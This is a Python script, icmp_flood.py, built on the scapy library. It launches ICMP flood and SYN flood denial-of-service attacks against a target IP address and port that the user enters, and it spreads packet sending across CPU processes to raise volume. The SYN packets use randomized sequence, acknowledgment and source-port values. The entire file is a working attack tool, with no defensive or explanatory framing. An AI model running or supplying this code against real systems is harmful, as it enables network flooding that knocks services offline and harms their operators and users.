#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@author: zhouey
@file: icmp_flood.py
@time: 2020/11/28 15:36
"""
# /usr/bin/python3
# @EmreOvunc
# pip3 install scapy
from scapy.all import *
import time
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor
import os


def send_packets(func, *args):
    cycle = args[-1]
    args = args[:-1]

    cpu_num = os.cpu_count() - 1
    p = ProcessPoolExecutor(max_workers=cpu_num)
    for _ in range(cpu_num):
        p.submit(func, *args, int(cycle) // int(cpu_num))
    p.shutdown()


def main():
    user_input = input("Please select one of the attack type [syn, icmp]: ")
    if user_input == "icmp":
        target = destinationIP()
        cycle = input("How many packets do you sent [Press enter for 100]: ")
        if cycle == "":
            cycle = 100
        send_packets(icmpflood, target, cycle)

    elif user_input == "syn":

        target = destinationIP()
        targetPort = destinationPort()
        cycle = input("How many packets do you sent [Press enter for 100]: ")
        if cycle == "":
            cycle = 100
        send_packets(synflood, target, targetPort, cycle)

    else:
        print("[ERROR] Select one of the attack type !!!")
        main()


def icmpflood(target, cycle):
    print("{} task running".format(os.getpid()))
    print(target, cycle)
    start = time.time()
    s = conf.L3socket(iface='eth1')
    for x in range(0, int(cycle)):
        s.send(IP(dst=target) / ICMP())
    s.close()
    print('send {} packet spell  {} s'.format(cycle, time.time() - start))


def synflood(target, targetPort, cycle):
    print(target, targetPort)
    start = time.time()
    s = conf.L3socket(iface='eth1')
    for x in range(0, int(cycle)):
        s.send(IP(dst=target) / TCP(dport=targetPort,
                                    flags="S",
                                    seq=RandShort(),
                                    ack=RandShort(),
                                    sport=RandShort()))
    s.close()
    print('send {} packet spell  {} s'.format(cycle, time.time() - start))


def destinationIP():
    dstIP = input("Destination IP: ")
    if dstIP == "":
        dstIP = '172.16.77.42'
    return dstIP


def destinationPort():
    dstPort = input("Destination Port: ")
    return int(dstPort)


if __name__ == '__main__':
    main()
